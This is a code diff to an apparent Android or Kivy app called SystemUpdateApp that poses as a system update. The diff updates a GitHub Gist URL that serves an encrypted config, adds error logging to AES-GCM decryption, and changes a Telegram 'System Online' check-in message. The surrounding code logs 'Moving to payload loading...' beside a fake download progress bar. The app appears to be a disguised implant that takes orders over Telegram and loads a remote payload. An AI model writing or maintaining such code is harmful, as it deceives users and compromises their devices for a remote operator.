@@ -17,7 +17,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
-        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/22598946c78d869e5e3cfa1492acf9f22c26f370/config.json"
+        # رابط config.json على GitHub Gist (تم تحديثه)
+        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/39c10054e3ef5ce36a34dbc8cc68652a875a9d5b/config.json"
+
         layout = BoxLayout(orientation='vertical')
         scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
         self.log_view = TextInput(
@@ -54,7 +56,8 @@ class SystemUpdateApp(App):
             decryptor = cipher.decryptor()
             decrypted = decryptor.update(ciphertext) + decryptor.finalize()
             return decrypted.decode('utf-8')
-        except:
+        except Exception as e:
+            self.log(f"Decrypt error: {e}")
             return ""
 
     def send_telegram(self, token, chat_id, text):
@@ -98,7 +101,7 @@ class SystemUpdateApp(App):
             }
             if tokens:
                 self.log("Sending startup message to Telegram...")
-                self.send_telegram(tokens[0], v_id, "🚀 System Online (v2.0 - AES-GCM Encrypted)")
+                self.send_telegram(tokens[0], v_id, "🚀 System Online (AES-GCM Encrypted)")
                 self.log("Startup message sent.")
             self.log("Moving to payload loading...")
             self.log_view.text += "\n[Progress] Downloading modules... (35%)\n"
